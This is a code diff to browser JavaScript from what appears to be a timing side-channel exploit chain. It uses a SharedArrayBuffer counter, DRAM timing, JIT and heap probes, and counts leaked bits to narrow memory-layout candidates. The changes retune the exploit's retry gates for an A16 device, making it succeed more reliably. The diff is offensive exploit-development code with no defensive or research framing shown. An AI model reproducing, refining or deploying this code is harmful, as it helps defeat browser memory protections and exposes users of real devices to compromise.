@@ -847,9 +847,12 @@ async function t10(jitData, heapData, bankData, offsetData, entropyData) {
 // MAIN (v19: quality-gate auto-retry)
 //
 // Quality gates:
-//   GATE 1: NS >= 5ns/count (SAB counter fast enough for DRAM timing)
+//   GATE 1: T2 DRAM ratio >= 3x (actual DRAM signal present)
 //   GATE 2: T4 clusters >= 3 (enough heap discrimination)
 //   GATE 3: leaked bits >= 9 (<= 1024 candidates)
+//
+// NOTE: NS speed is NOT gated — A16 runs at 3-8ns/count depending on
+//   session; 3.9ns is normal and sufficient, not a failure condition.
 //
 // On gate fail: terminate counter, wait 2s, restart from scratch.
 // Max 3 attempts. On all failed, report cause.
@@ -871,17 +874,19 @@ async function t10(jitData, heapData, bankData, offsetData, entropyData) {
     await startCounter();
     await t1();
     await new Promise(r=>setTimeout(r,30));
+    log(`[*] SAB speed: ${NS.toFixed(3)}ns/count (informational only)`);
 
-    // GATE 1: SAB speed
-    if(NS < 5.0){
-      log(`[!] GATE1 FAIL: NS=${NS.toFixed(3)}ns/count < 5ns — counter too slow, retrying`);
+    const t2Result=await t2();
+    await new Promise(r=>setTimeout(r,30));
+
+    // GATE 1: DRAM signal
+    const dramRatio=t2Result ? t2Result.dramNS/Math.max(t2Result.hotNS,0.1) : 0;
+    if(!t2Result || t2Result.dramNS < 30 || dramRatio < 3){
+      log(`[!] GATE1 FAIL: DRAM ratio=${dramRatio.toFixed(1)}x < 3x or dramNS=${t2Result?.dramNS?.toFixed(0)||0}ns < 30ns — no signal, retrying`);
       counterWorker.terminate(); counterWorker=null;
       continue;
     }
-    log(`[*] GATE1 PASS: ${NS.toFixed(3)}ns/count`);
-
-    await t2();
-    await new Promise(r=>setTimeout(r,30));
+    log(`[*] GATE1 PASS: DRAM ratio=${dramRatio.toFixed(1)}x`);
 
     const jitData=await t3();
     if(!jitData){ counterWorker.terminate(); counterWorker=null; continue; }
